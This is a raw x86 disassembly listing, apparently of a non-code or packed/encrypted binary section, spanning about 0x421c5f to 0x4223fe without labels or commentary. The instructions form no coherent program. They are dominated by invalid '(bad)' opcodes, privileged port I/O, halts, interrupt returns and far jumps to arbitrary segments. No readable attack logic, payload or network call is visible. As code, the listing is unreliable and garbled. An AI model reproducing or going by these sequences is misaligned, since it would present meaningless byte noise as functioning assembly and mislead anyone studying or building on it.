  421c5f:	mov    esi,0xc59cfca7
  421c64:	mov    dh,0x1a
  421c66:	sbb    bl,bl
  421c68:	xchg   ecx,eax
  421c69:	mov    ebx,0x4336a723
  421c6e:	outs   dx,DWORD PTR ds:[esi]
  421c6f:	test   eax,0x37646b61
  421c74:	pop    eax
  421c75:	inc    ebx
  421c76:	mov    ch,dl
  421c78:	adc    edx,DWORD PTR ds:[ebx-0x3188f55f]
  421c7f:	dec    ebx
  421c80:	pop    ebx
  421c81:	jp     0x421c45
  421c83:	stos   DWORD PTR es:[edi],eax
  421c84:	fstp   QWORD PTR [ebp+0x1c8f5986]
  421c8a:	ja     0x421d06
  421c8c:	jno    0x421c37
  421c8e:	scas   al,BYTE PTR es:[edi]
  421c8f:	and    ch,BYTE PTR [ebp-0x2e]
  421c92:	sbb    eax,0xb54a14a2
  421c97:	aaa    
  421c98:	iret   
  421c99:	push   es
  421c9a:	ret    0xe49
  421c9d:	cmc    
  421c9e:	popf   
  421c9f:	out    0x76,eax
  421ca1:	test   dh,cl
  421ca3:	addr16 pop ebp
  421ca5:	push   ebx
  421ca6:	pop    es
  421ca7:	hlt    
  421ca8:	pop    ss
  421ca9:	pop    eax
  421caa:	sub    ebp,ebx
  421cac:	add    al,0x2a
  421cae:	js     0x421c9e
  421cb0:	pushf  
  421cb1:	or     BYTE PTR [eax+eax*8+0x68],0x83
  421cb6:	arpl   sp,cx
  421cb8:	fstp   st(1)
  421cba:	jbe    0x421d28
  421cbc:	sub    al,0x42
  421cbe:	aad    0x15
  421cc0:	jae    0x421cb4
  421cc2:	popa   
  421cc3:	inc    edx
  421cc4:	pushf  
  421cc5:	mov    esp,0x6b3f61ee
  421cca:	jge    0x421c64
  421ccc:	idiv   DWORD PTR [eax]
  421cce:	dec    eax
  421ccf:	and    DWORD PTR [esi],ebp
  421cd1:	push   cs
  421cd2:	sahf   
  421cd3:	rcl    DWORD PTR [eax+0x5997b0e3],0x3f
  421cda:	jbe    0x421cf7
  421cdc:	stos   BYTE PTR es:[edi],al
  421cdd:	mov    ds:0x89c96b18,al
  421ce2:	outs   dx,BYTE PTR ds:[esi]
  421ce3:	and    dl,BYTE PTR [eax-0x60a898e]
  421ce9:	inc    ecx
  421cea:	mov    esp,0xc501dc29
  421cef:	jns    0x421d6d
  421cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cf2:	jno    0x421c7b
  421cf4:	sub    edx,ebx
  421cf6:	cwde   
  421cf7:	fistp  DWORD PTR [ebp+0x3340852]
  421cfd:	dec    esi
  421cfe:	fisub  DWORD PTR ds:0xd30f47c8
  421d04:	int3   
  421d05:	cld    
  421d06:	or     bl,BYTE PTR [eax-0x4f]
  421d09:	int3   
  421d0a:	push   ebp
  421d0b:	jbe    0x421d4e
  421d0d:	cli    
  421d0e:	add    edx,edx
  421d10:	popf   
  421d11:	test   eax,0x49126f48
  421d16:	push   eax
  421d17:	sti    
  421d18:	aad    0x1c
  421d1a:	and    BYTE PTR [esi+0x53],al
  421d1d:	ret    
  421d1e:	(bad)  
  421d1f:	iret   
  421d20:	out    0x63,eax
  421d22:	das    
  421d23:	mov    ds:0xba558cad,al
  421d28:	or     dh,dh
  421d2a:	nop
  421d2b:	or     BYTE PTR [edx+0x65e7f5c6],bl
  421d31:	sub    edx,edi
  421d33:	or     dl,BYTE PTR [edi+0x57220274]
  421d39:	jae    0x421d8b
  421d3b:	sbb    ebx,edx
  421d3d:	add    eax,0xf67b7af5
  421d42:	call   0xad63ea87
  421d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d48:	test   al,0x81
  421d4a:	push   es
  421d4b:	je     0x421d8e
  421d4d:	push   edx
  421d4e:	clc    
  421d4f:	push   ebp
  421d50:	loopne 0x421d44
  421d52:	(bad)  
  421d53:	rcr    BYTE PTR [edi-0x5a80a5b7],1
  421d59:	lods   eax,DWORD PTR ds:[esi]
  421d5a:	xchg   BYTE PTR [esi],ch
  421d5c:	lds    esi,FWORD PTR [edx]
  421d5e:	loope  0x421d2f
  421d60:	mov    ds:0x364a7f7e,eax
  421d65:	fcomip st,st(6)
  421d67:	aad    0xab
  421d69:	add    eax,DWORD PTR [ecx]
  421d6b:	arpl   WORD PTR [ecx],cx
  421d6d:	jnp    0x421cfa
  421d6f:	and    DWORD PTR [edi-0x1a],esp
  421d72:	rcr    DWORD PTR [edx+eiz*8-0x18a5c9bb],0x8
  421d7a:	out    dx,al
  421d7b:	xor    DWORD PTR ds:0xc629150d,0xa38e8401
  421d85:	mov    ebx,0x3665ba69
  421d8a:	sti    
  421d8b:	fld    TBYTE PTR [ecx]
  421d8d:	or     eax,0xceb1c13f
  421d92:	sub    ecx,DWORD PTR [edx-0x105002ef]
  421d98:	mov    ds:0x1ca763a2,al
  421d9d:	jg     0x421d42
  421d9f:	test   DWORD PTR [eax+0x59],ebp
  421da2:	dec    ebp
  421da3:	jge    0x421d4d
  421da5:	sbb    al,0xaf
  421da7:	lods   eax,DWORD PTR ds:[esi]
  421da8:	xor    DWORD PTR [edi],edi
  421daa:	sub    esp,eax
  421dac:	mov    WORD PTR ds:0xc2ef23f2,es
  421db2:	imul   esp,DWORD PTR [edi-0x4d26e0e],0x52de2044
  421dbc:	repz pushf 
  421dbe:	ret    0x63ff
  421dc1:	pop    es
  421dc2:	rcl    BYTE PTR [ebx-0x26],1
  421dc5:	add    dh,BYTE PTR [edx+0xf]
  421dc8:	fadd   QWORD PTR [edi]
  421dca:	and    BYTE PTR [eax+0x5],cl
  421dcd:	adc    eax,0x8bae99a7
  421dd2:	xchg   BYTE PTR [edi+0x12],bh
  421dd5:	inc    esp
  421dd6:	xor    bl,BYTE PTR [ebx]
  421dd8:	xor    BYTE PTR [ebx-0x673e9eb4],dh
  421dde:	mov    eax,ds:0x2aecb1e1
  421de3:	stc    
  421de4:	aas    
  421de5:	nop
  421de6:	fistp  DWORD PTR ds:0x737d4a63
  421dec:	lods   al,BYTE PTR ds:[esi]
  421ded:	pop    ds
  421dee:	out    dx,eax
  421def:	jmp    0x7cb3f632
  421df4:	mov    ebx,fs
  421df6:	icebp  
  421df7:	or     bh,ah
  421df9:	xchg   bx,ax
  421dfb:	pop    ebp
  421dfc:	sub    edi,DWORD PTR [ecx-0x2d]
  421dff:	mov    ebp,0x866a34a6
  421e04:	rcl    cl,1
  421e06:	mov    esi,0x3e0afd7e
  421e0b:	sti    
  421e0c:	xlat   BYTE PTR ds:[ebx]
  421e0d:	pop    ebp
  421e0e:	pushf  
  421e0f:	(bad)  
  421e10:	cmp    DWORD PTR es:[edi-0x769a0e8d],ecx
  421e17:	nop
  421e18:	ror    BYTE PTR [ebx+0x70],cl
  421e1b:	add    DWORD PTR [edi+0x327c9205],0xffffff89
  421e22:	and    al,0x34
  421e24:	out    0xf4,eax
  421e26:	push   edi
  421e27:	shl    BYTE PTR [ecx+ecx*8-0x13350334],0x70
  421e2f:	xchg   esi,eax
  421e30:	cmp    bh,al
  421e32:	stos   DWORD PTR es:[edi],eax
  421e33:	stos   BYTE PTR es:[edi],al
  421e34:	xchg   ebx,eax
  421e35:	repnz pop esi
  421e37:	dec    ebx
  421e38:	push   eax
  421e39:	fdivrp st(0),st
  421e3b:	neg    BYTE PTR [edx+0x7aca04cd]
  421e41:	pop    ss
  421e42:	and    dh,BYTE PTR [ebp+eax*8+0x5d869731]
  421e49:	jl     0x421e00
  421e4b:	fistp  QWORD PTR [eax+0x2d]
  421e4e:	out    dx,al
  421e4f:	dec    ecx
  421e50:	and    DWORD PTR [ebx],edi
  421e52:	push   0x174551f8
  421e57:	das    
  421e58:	mov    cl,0xcb
  421e5a:	or     dh,bh
  421e5c:	(bad)  
  421e5e:	add    edx,DWORD PTR [edi]
  421e60:	ja     0x421ed0
  421e62:	mov    eax,?
  421e64:	sbb    al,dl
  421e66:	and    DWORD PTR [eax+0x10ca2641],ebp
  421e6c:	inc    esp
  421e6d:	inc    esi
  421e6e:	jg     0x421ea3
  421e70:	mov    ebx,0xa5220545
  421e75:	dec    esp
  421e76:	out    dx,al
  421e77:	jp     0x421e49
  421e79:	mov    cl,0x9
  421e7b:	jns    0x421e9a
  421e7d:	sbb    ah,BYTE PTR [edx+0x3c0af481]
  421e83:	adc    eax,0xc166aaa7
  421e88:	sbb    edi,DWORD PTR [edi-0x35d66b9d]
  421e8e:	push   ecx
  421e8f:	adc    dl,BYTE PTR [ecx]
  421e91:	mov    ch,0x7b
  421e93:	xchg   DWORD PTR [edx],ebx
  421e95:	push   eax
  421e96:	repnz inc edx
  421e98:	pusha  
  421e99:	add    BYTE PTR [ecx],0x87
  421e9c:	sub    BYTE PTR [ebp+0x152fe819],al
  421ea2:	in     al,0xe0
  421ea4:	imul   eax,DWORD PTR [eax+0x4380558e],0x94cdebdd
  421eae:	cmp    eax,DWORD PTR [edi-0x4f]
  421eb1:	adc    ebp,eax
  421eb3:	jmp    0x421eda
  421eb5:	test   esp,ecx
  421eb7:	cmc    
  421eb8:	gs jp  0x421f06
  421ebb:	mov    ebx,DWORD PTR [edi]
  421ebd:	jge    0x421e5d
  421ebf:	iret   
  421ec0:	add    al,0x5a
  421ec2:	dec    eax
  421ec3:	adc    BYTE PTR [eax],0x7e
  421ec6:	push   ebx
  421ec7:	or     ebp,esi
  421ec9:	clc    
  421eca:	fcmovnbe st,st(5)
  421ecc:	fs mov dl,0xa6
  421ecf:	jmp    DWORD PTR [edx-0x1f00f827]
  421ed5:	iret   
  421ed6:	scas   al,BYTE PTR es:[edi]
  421ed7:	mov    ebx,DWORD PTR [esi+0x658d13a8]
  421edd:	mov    ss,WORD PTR ds:[edx+0x776f2a9b]
  421ee4:	mov    BYTE PTR [esi+0x5aee62fe],dh
  421eea:	test   al,0x75
  421eec:	inc    ebx
  421eed:	pop    ebx
  421eee:	sub    BYTE PTR [edx-0x1f192334],dl
  421ef4:	dec    edx
  421ef5:	jb     0x421eae
  421ef7:	push   cs
  421ef8:	mov    bl,0x89
  421efa:	fdiv   QWORD PTR [eax-0x2a67c727]
  421f00:	xchg   ecx,eax
  421f01:	aas    
  421f02:	adc    al,0x7c
  421f04:	in     al,0x5a
  421f06:	aaa    
  421f07:	idiv   ecx
  421f09:	repnz scas al,BYTE PTR es:[edi]
  421f0b:	dec    esi
  421f0c:	mov    dh,0x6f
  421f0e:	out    dx,al
  421f0f:	repnz daa 
  421f11:	pop    edx
  421f12:	jno    0x421f6a
  421f14:	repz jle 0x421ec3
  421f17:	mov    ebp,0x7ecc57de
  421f1c:	dec    ecx
  421f1d:	or     BYTE PTR [eax+0x1f],al
  421f20:	clc    
  421f21:	xor    BYTE PTR [ecx],0x72
  421f24:	jg     0x421eb5
  421f26:	(bad)  
  421f27:	adc    BYTE PTR [edi+0x223357e6],bh
  421f2d:	inc    esp
  421f2e:	xchg   esi,eax
  421f2f:	jg     0x421f4a
  421f31:	add    ecx,DWORD PTR [ebx]
  421f33:	dec    esp
  421f34:	push   esi
  421f35:	pop    ebp
  421f36:	or     eax,DWORD PTR [eax-0x2d]
  421f39:	adc    ebp,ecx
  421f3b:	test   al,0x6d
  421f3d:	dec    ebp
  421f3e:	cmp    eax,0x14f1bd13
  421f43:	xor    eax,0x332abcc5
  421f48:	out    dx,al
  421f49:	sub    al,BYTE PTR [eax]
  421f4b:	daa    
  421f4c:	add    esp,DWORD PTR [edi]
  421f4e:	mov    edx,0x334633b8
  421f53:	xlat   BYTE PTR ds:[ebx]
  421f54:	adc    eax,0x80e04973
  421f59:	mov    BYTE PTR [edi],al
  421f5b:	add    BYTE PTR [esi+0x54f35a2],0x43
  421f62:	add    esi,eax
  421f64:	lods   al,BYTE PTR ds:[esi]
  421f65:	call   0xe6ca:0xb1004c94
  421f6c:	push   ds
  421f6d:	xor    BYTE PTR [edi+0x7],cl
  421f70:	(bad)  
  421f71:	aam    0xe8
  421f73:	dec    ebx
  421f74:	icebp  
  421f75:	jl     0x421ff6
  421f77:	sti    
  421f78:	mov    cl,0xb5
  421f7a:	jg     0x421fce
  421f7c:	rcr    DWORD PTR [edx],cl
  421f7e:	sub    dh,BYTE PTR [ebp-0x224e4cb0]
  421f84:	out    dx,al
  421f85:	in     al,dx
  421f86:	xchg   ebp,eax
  421f87:	mov    bl,0x6d
  421f89:	jae    0x421f35
  421f8b:	rcl    DWORD PTR [ebp+0x1a],1
  421f8e:	out    dx,al
  421f8f:	inc    edi
  421f90:	(bad)  
  421f91:	jle    0x421f87
  421f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f94:	js     0x421f88
  421f96:	jmp    0x421f9e
  421f98:	shr    BYTE PTR [ebx-0x764d8f66],cl
  421f9e:	les    esi,FWORD PTR [esi-0x80]
  421fa1:	xchg   edi,eax
  421fa2:	int3   
  421fa3:	mov    ds:0x200537f0,al
  421fa8:	fisttp QWORD PTR [ecx]
  421faa:	jae    0x421ffd
  421fac:	(bad)  
  421fad:	sar    BYTE PTR ds:0x31a63af1,cl
  421fb3:	cdq    
  421fb4:	outs   dx,BYTE PTR ds:[esi]
  421fb5:	punpckhdq mm6,QWORD PTR [ebp+0x71]
  421fb9:	jp     0x421fbd
  421fbb:	arpl   si,bp
  421fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fbe:	rol    BYTE PTR [edi],0xa4
  421fc1:	call   0xe671:0x5348fd06
  421fc8:	cmp    dl,0xa
  421fcb:	or     BYTE PTR [ecx+0x66],ch
  421fce:	sbb    ebx,DWORD PTR [esi+0x72ea695c]
  421fd4:	or     edi,edx
  421fd6:	mov    edi,0x16545ca5
  421fdb:	inc    edi
  421fdc:	scas   al,BYTE PTR es:[edi]
  421fdd:	pop    esp
  421fde:	mov    bh,0xb1
  421fe0:	scas   eax,DWORD PTR es:[edi]
  421fe1:	loopne 0x421ff9
  421fe3:	and    ch,dh
  421fe5:	ds pop esp
  421fe7:	xchg   esp,eax
  421fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fe9:	out    dx,al
  421fea:	cmp    eax,DWORD PTR [ebx-0x29]
  421fed:	sub    ch,dl
  421fef:	pop    esp
  421ff0:	lea    ebx,cs:[ebx+0xe3c24b]
  421ff7:	repnz inc ebx
  421ff9:	or     edi,eax
  421ffb:	enter  0x3096,0xb4
  421fff:	ror    ebp,cl
  422001:	cmp    edx,DWORD PTR [edi+0x77]
  422004:	xchg   esi,eax
  422005:	inc    eax
  422006:	aas    
  422007:	mov    bl,0xb8
  422009:	div    BYTE PTR [eax]
  42200b:	pushf  
  42200c:	imul   ecx,DWORD PTR [eax],0xb4480d3
  422012:	out    0x7e,al
  422014:	in     eax,dx
  422015:	(bad)  
  422017:	mov    ch,0x5b
  422019:	add    DWORD PTR [ebx-0x5c0dfca2],ebp
  42201f:	adc    BYTE PTR [ebx+0x4f],bl
  422022:	jp     0x421fa9
  422024:	arpl   WORD PTR [ecx+0x4d],bx
  422027:	mov    esp,0x451dfe05
  42202c:	sbb    dl,BYTE PTR [edx]
  42202e:	xor    ebp,edi
  422030:	ss sahf 
  422032:	xor    eax,0x2691c481
  422037:	mov    bl,BYTE PTR [eax+0x1f430855]
  42203d:	cmc    
  42203e:	push   ecx
  42203f:	inc    edi
  422040:	outs   dx,DWORD PTR ds:[esi]
  422041:	adc    bh,BYTE PTR [esi+eiz*2+0x3b1a2c40]
  422048:	cli    
  422049:	sub    edi,eax
  42204b:	or     ebx,DWORD PTR [edx-0x327a7429]
  422051:	fs mov cl,0xd4
  422054:	mov    eax,0xa948cc42
  422059:	push   esp
  42205a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42205b:	pop    ebp
  42205c:	mov    bl,dl
  42205e:	stos   DWORD PTR es:[edi],eax
  42205f:	test   DWORD PTR [ecx+0x65],ecx
  422062:	xor    al,0xba
  422064:	push   0x459bf452
  422069:	repnz imul ecx,DWORD PTR [eax+0x657f5dd2],0xf11c4253
  422074:	icebp  
  422075:	dec    edi
  422076:	ret    
  422077:	mov    edx,0x36e5e4c8
  42207c:	call   0x86e:0x39aa4636
  422083:	dec    ebp
  422084:	inc    ecx
  422085:	push   0x8a96ddb6
  42208a:	ror    bl,1
  42208c:	cli    
  42208d:	cmovb  ecx,ebp
  422090:	popf   
  422091:	mov    eax,ds:0x5e7ab141
  422096:	les    esi,FWORD PTR [ebx+0x63a17bb6]
  42209c:	cli    
  42209d:	test   BYTE PTR [eax-0x891989a],bl
  4220a3:	inc    edi
  4220a4:	lods   al,BYTE PTR ds:[esi]
  4220a5:	add    edx,ebp
  4220a7:	pop    ecx
  4220a8:	jo     0x42206b
  4220aa:	push   0x54f6fe63
  4220af:	and    dh,ah
  4220b1:	xchg   edx,eax
  4220b2:	stc    
  4220b3:	push   0xd77ec455
  4220b8:	outs   dx,DWORD PTR ds:[esi]
  4220b9:	push   eax
  4220ba:	push   edx
  4220bb:	in     al,0x39
  4220bd:	mov    eax,0x4bb6f187
  4220c2:	jmp    0x42213a
  4220c4:	das    
  4220c5:	dec    esi
  4220c6:	mov    bh,BYTE PTR [edi-0x2f]
  4220c9:	retf   
  4220ca:	cwde   
  4220cb:	rcl    BYTE PTR [ebx+0x46],cl
  4220ce:	cmp    eax,0xfd52710d
  4220d3:	es push eax
  4220d5:	test   al,0x7a
  4220d7:	push   es
  4220d8:	mov    bh,0xb7
  4220da:	call   0xe705:0xe0459013
  4220e1:	test   DWORD PTR [edx+edx*8+0x3a],edi
  4220e5:	(bad)  
  4220e7:	loop   0x422106
  4220e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220ea:	pusha  
  4220eb:	cdq    
  4220ec:	xchg   esi,eax
  4220ed:	mov    edi,0xb645d93a
  4220f2:	or     DWORD PTR [ecx-0x23],eax
  4220f5:	in     al,dx
  4220f6:	repnz adc edx,DWORD PTR [ecx-0x7e]
  4220fa:	js     0x42210b
  4220fc:	sub    al,0x3f
  4220fe:	enter  0xfa6,0x45
  422102:	dec    ebx
  422103:	(bad)  [eax+0x7a]
  422106:	mov    dl,0xa9
  422108:	push   esp
  422109:	add    eax,0xe6dbde4a
  42210e:	cmp    ax,0xd6b5
  422112:	xchg   BYTE PTR [eax+eax*1-0x3c],bl
  422116:	xchg   esp,eax
  422117:	iret   
  422118:	and    ah,ah
  42211a:	jl     0x4220d6
  42211c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42211d:	mov    ebx,0xbcaeae93
  422122:	push   ebp
  422123:	neg    DWORD PTR [esi-0x205fe6ad]
  422129:	pop    ds
  42212a:	sbb    DWORD PTR [ebx-0x18f3bcd3],ecx
  422130:	push   es
  422131:	test   eax,0xe7a943b3
  422136:	pop    edi
  422137:	or     BYTE PTR es:[edi-0x48],bh
  42213b:	pop    esi
  42213c:	les    ebp,FWORD PTR [edx+esi*2+0x61]
  422140:	pop    ebx
  422141:	fcompp 
  422143:	jl     0x4220d4
  422145:	sbb    edx,DWORD PTR [edx]
  422147:	pushf  
  422148:	push   ss
  422149:	ins    BYTE PTR es:[edi],dx
  42214a:	push   edi
  42214b:	ins    DWORD PTR es:[edi],dx
  42214c:	arpl   WORD PTR [edi+edi*4+0x52cdcab4],cx
  422153:	inc    ebx
  422154:	inc    ebx
  422155:	int    0x74
  422157:	loop   0x422178
  422159:	jo     0x4220e6
  42215b:	leave  
  42215c:	jmp    0xfc6e:0xd9034a5f
  422163:	fidiv  DWORD PTR [ebp-0x60]
  422166:	jecxz  0x42218f
  422168:	ja     0x42217c
  42216a:	inc    esi
  42216b:	dec    edi
  42216c:	sub    eax,0x5b9f9e4e
  422171:	fcomi  st,st(0)
  422173:	out    dx,al
  422174:	push   ebp
  422175:	aas    
  422176:	push   eax
  422177:	pushf  
  422178:	ja     0x4221b0
  42217a:	mov    gs,WORD PTR [edi+0x6058cf0f]
  422180:	fadd   st,st(5)
  422182:	adc    al,0x69
  422184:	(bad)  
  422185:	xor    ebx,DWORD PTR [eax]
  422187:	stc    
  422188:	mov    eax,ds:0x3dd931b6
  42218d:	push   ss
  42218e:	mov    bh,0x58
  422190:	neg    DWORD PTR [eax]
  422192:	push   0x77a035b9
  422197:	loop   0x42215d
  422199:	js     0x4221ad
  42219b:	push   ss
  42219c:	(bad)  
  42219d:	xchg   esi,eax
  42219e:	stc    
  42219f:	or     dl,BYTE PTR [ecx-0x79664d9a]
  4221a5:	sub    ecx,edx
  4221a7:	std    
  4221a8:	out    dx,eax
  4221a9:	sbb    DWORD PTR [esi+0x67fb6c4],edi
  4221af:	scas   eax,DWORD PTR es:[edi]
  4221b0:	xchg   edi,eax
  4221b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221b2:	loopne 0x4221ad
  4221b4:	sub    dh,BYTE PTR [ecx+0x74]
  4221b7:	mov    ds:0xad3ae8c1,al
  4221bc:	fs adc eax,0x2109cc3c
  4221c2:	pop    ecx
  4221c3:	dec    edi
  4221c4:	jge    0x422234
  4221c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221c7:	ret    
  4221c8:	gs cmp eax,0xfdf8f7ee
  4221ce:	mov    eax,ds:0x1e02bf33
  4221d3:	repz push ebp
  4221d5:	xor    al,0x2
  4221d7:	mov    esp,0x1035c0a2
  4221dc:	imul   edi,DWORD PTR [edx+0x4c],0x66
  4221e0:	test   eax,0xbeb9423e
  4221e5:	imul   ecx,DWORD PTR [ebx+eax*4-0x1407b130],0xffffffde
  4221ed:	shl    DWORD PTR [ecx],0xb8
  4221f0:	mov    ch,0x7f
  4221f2:	and    DWORD PTR [esi+0xd],ebp
  4221f5:	jge    0x42220f
  4221f7:	ds es das 
  4221fa:	shl    BYTE PTR [eax+0x58d07475],0xe0
  422201:	push   ds
  422202:	push   cs
  422203:	or     al,0xe4
  422205:	adc    bh,0x4
  422208:	xor    al,0x4c
  42220a:	in     eax,dx
  42220b:	push   ds
  42220c:	sahf   
  42220d:	sub    DWORD PTR [ebp+0x1d],eax
  422210:	mov    BYTE PTR [eax],al
  422212:	hlt    
  422213:	mov    eax,ds:0xfc3dbce8
  422218:	jp     0x4221bf
  42221a:	loop   0x42227a
  42221c:	int3   
  42221d:	and    ebp,DWORD PTR [eax]
  42221f:	sbb    al,0xf8
  422222:	ja     0x4221ff
  422224:	jmp    0xfc34:0x2c051d1e
  42222b:	add    ebx,esi
  42222d:	mov    edi,0xc2d877f3
  422232:	cmc    
  422233:	adc    eax,0xdc7f8777
  422238:	xor    BYTE PTR [edi-0xc],cl
  42223b:	xor    BYTE PTR [edx+0x42b60734],dl
  422241:	pop    ecx
  422242:	pop    esi
  422243:	or     eax,DWORD PTR [eax+0x71]
  422246:	sbb    dh,BYTE PTR [ecx]
  422248:	std    
  422249:	pop    eax
  42224a:	js     0x42223c
  42224c:	push   es
  42224d:	in     al,dx
  42224e:	clc    
  42224f:	in     eax,dx
  422250:	xchg   ecx,eax
  422251:	(bad)  
  422252:	aam    0x3a
  422254:	jns    0x4222c4
  422256:	jno    0x42228e
  422258:	(bad)  
  422259:	and    ch,BYTE PTR [esi]
  42225b:	cmp    DWORD PTR [edi-0x1559f5e3],esp
  422261:	pushf  
  422262:	or     al,BYTE PTR [ebp-0x16]
  422265:	mov    dl,0x1d
  422267:	inc    esp
  422268:	rcl    dh,cl
  42226a:	jecxz  0x422223
  42226c:	fbstp  TBYTE PTR ds:0xa34f7c01
  422272:	sub    eax,0x8521934f
  422277:	inc    edx
  422278:	(bad)  
  422279:	push   esi
  42227a:	les    edi,FWORD PTR [ecx-0xb22ebcd]
  422280:	add    edi,DWORD PTR [ebp-0x40]
  422283:	inc    edx
  422284:	sbb    bh,BYTE PTR [edx-0x4]
  422287:	rcr    DWORD PTR [edx],1
  422289:	mov    al,ds:0x1a2b15fb
  42228e:	ins    BYTE PTR es:[edi],dx
  42228f:	and    al,0xf3
  422291:	xor    al,0x8
  422293:	add    al,0x37
  422295:	lds    edi,FWORD PTR [ebx-0x3c]
  422298:	jo     0x4222ac
  42229a:	ss adc eax,0xb7df7e57
  4222a0:	jns    0x422238
  4222a2:	push   edx
  4222a3:	test   ah,0xb9
  4222a6:	pop    ss
  4222a7:	fdiv   DWORD PTR [eax-0x7b952b2e]
  4222ad:	rcl    DWORD PTR [ebp+0x29f1ee1a],cl
  4222b3:	lea    eax,[esi-0x2d]
  4222b6:	sub    esi,DWORD PTR [eax]
  4222b8:	adc    al,0xa2
  4222ba:	jecxz  0x4222fa
  4222bc:	std    
  4222bd:	ss jle 0x4222ec
  4222c0:	xchg   esp,eax
  4222c1:	ds xchg ebx,eax
  4222c3:	mov    dh,0x48
  4222c5:	push   ecx
  4222c6:	and    eax,0x92fef0c4
  4222cb:	push   cs
  4222cc:	inc    eax
  4222cd:	pop    es
  4222ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222cf:	sbb    al,0xc7
  4222d1:	jb     0x422325
  4222d3:	sub    ebp,DWORD PTR [esi-0x75]
  4222d6:	mov    bl,0x75
  4222d8:	mov    ch,0x95
  4222da:	xor    eax,0xbf3bc8e0
  4222df:	mov    eax,ds:0x7d046f9b
  4222e4:	out    0xab,eax
  4222e6:	inc    ebx
  4222e7:	dec    esi
  4222e8:	das    
  4222e9:	mov    ah,0xf8
  4222eb:	call   0xe754:0x3879c952
  4222f2:	adc    al,0x21
  4222f4:	jns    0x422341
  4222f6:	and    DWORD PTR [ecx],ebp
  4222f8:	push   esp
  4222f9:	fmul   QWORD PTR [eax-0x6b]
  4222fc:	ins    BYTE PTR es:[edi],dx
  4222fd:	mov    ecx,0xd6ba5e5c
  422302:	jae    0x422328
  422304:	scas   al,BYTE PTR es:[edi]
  422305:	(bad)  
  422306:	dec    ebx
  422307:	ret    0x85cb
  42230a:	jge    0x4222f8
  42230c:	pop    esp
  42230d:	nop
  42230e:	jno    0x422367
  422310:	mov    ch,BYTE PTR [ebp-0x22bf5da7]
  422316:	(bad)  
  422317:	repnz mov BYTE PTR [ecx+0x0],bh
  42231b:	and    al,0x8b
  42231d:	rsqrtps xmm3,XMMWORD PTR [edx]
  422320:	adc    DWORD PTR [edi-0x33aa3601],ebp
  422326:	and    ebp,DWORD PTR [ecx+0xe845187]
  42232c:	sbb    cl,dh
  42232e:	push   esi
  42232f:	and    eax,0x75c9e3e1
  422334:	add    bh,ah
  422336:	js     0x4222e8
  422338:	dec    esp
  422339:	cmp    eax,0xef90bfb5
  42233e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422340:	cmp    edi,DWORD PTR [edi-0x7d]
  422343:	popa   
  422344:	and    cl,0x6d
  422347:	scas   al,BYTE PTR es:[edi]
  422348:	xor    esi,DWORD PTR [eax-0x34]
  42234b:	pop    esp
  42234c:	test   BYTE PTR [esi],bl
  42234e:	(bad)  
  42234f:	xor    eax,0x868d45db
  422354:	clc    
  422355:	out    0xda,eax
  422357:	mov    cl,0x85
  422359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42235a:	jmp    0xc637:0x9ce27f44
  422361:	shr    DWORD PTR [edx+edi*1-0x6d],1
  422365:	jnp    0x422376
  422367:	pop    esi
  422368:	xchg   esp,eax
  422369:	pop    ss
  42236a:	lds    eax,FWORD PTR [ebp+esi*1+0x20558558]
  422371:	sbb    bh,BYTE PTR [esi]
  422373:	pop    ecx
  422374:	xchg   ebx,eax
  422375:	inc    eax
  422376:	mov    esi,0x51dc0ceb
  42237b:	push   esp
  42237c:	sub    al,0xb3
  42237e:	ins    DWORD PTR es:[edi],dx
  42237f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422380:	mov    edi,0x3e4c9155
  422385:	fsubr  DWORD PTR [edx+0x5b]
  422388:	nop
  422389:	push   esi
  42238a:	or     DWORD PTR [edx-0x69],esi
  42238d:	mov    bh,0x1
  42238f:	lock pop es
  422391:	inc    ecx
  422392:	repz push esp
  422394:	stos   BYTE PTR es:[edi],al
  422395:	mov    esi,0xd6ce4cec
  42239a:	scas   al,BYTE PTR es:[edi]
  42239b:	imul   edi,DWORD PTR [edi-0x4c4c76e3],0x44
  4223a2:	loope  0x42233b
  4223a4:	pop    ss
  4223a5:	jg     0x422362
  4223a7:	outs   dx,DWORD PTR ds:[esi]
  4223a8:	push   cs
  4223a9:	fsubr  DWORD PTR [ecx+ebx*4+0x41]
  4223ad:	push   ecx
  4223ae:	and    bl,dh
  4223b0:	push   edx
  4223b1:	sub    BYTE PTR [eax+0x3e],ah
  4223b4:	jno    0x42235e
  4223b6:	mov    BYTE PTR [edx],al
  4223b8:	jns    0x4223f7
  4223ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223bb:	in     al,dx
  4223bc:	fsubr  QWORD PTR [esi-0x1b]
  4223bf:	xchg   esp,eax
  4223c0:	ds mov cl,0x97
  4223c3:	xchg   edx,eax
  4223c4:	mov    dh,0xa
  4223c6:	sbb    eax,0x51d462c6
  4223cb:	ss mov eax,ds
  4223ce:	pop    esp
  4223cf:	mov    ebp,gs
  4223d1:	shl    BYTE PTR [ecx+0x7705f89],0x6a
  4223d8:	ficom  DWORD PTR [ebx]
  4223da:	ror    DWORD PTR [ecx-0x6ea96e0e],1
  4223e0:	and    esp,DWORD PTR [ebx]
  4223e2:	mov    ah,BYTE PTR [edi-0x27]
  4223e5:	mov    BYTE PTR [ebp-0x1f],ch
  4223e8:	in     eax,0x9d
  4223ea:	inc    ebx
  4223eb:	lahf   
  4223ec:	pushf  
  4223ed:	dec    esp
  4223ee:	xor    bl,dh
  4223f0:	or     BYTE PTR [edx+0xb],dl
  4223f3:	adc    cl,dh
  4223f5:	mov    esi,0xe670300b
  4223fa:	push   esp
  4223fb:	retf   
  4223fc:	and    al,0xbf
  4223fe:	xor    esi,DWORD PTR [eax]
